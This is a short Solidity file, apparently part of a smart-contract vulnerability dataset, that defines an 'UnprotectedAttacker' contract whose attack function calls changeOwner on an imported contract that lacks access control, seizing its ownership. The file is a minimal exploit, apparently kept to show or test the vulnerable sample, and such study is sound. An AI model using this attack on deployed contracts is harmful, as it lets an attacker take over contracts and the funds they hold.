 pragma solidity ^0.4.15;

 import "../dataset/access_control/unprotected0.sol";

 contract UnprotectedAttacker{
    
    Unprotected target;

    constructor(address _target) public {
        target = Unprotected(_target);
    }

    function attack(address newOwner) public {
        target.changeOwner(newOwner);
    }

 }
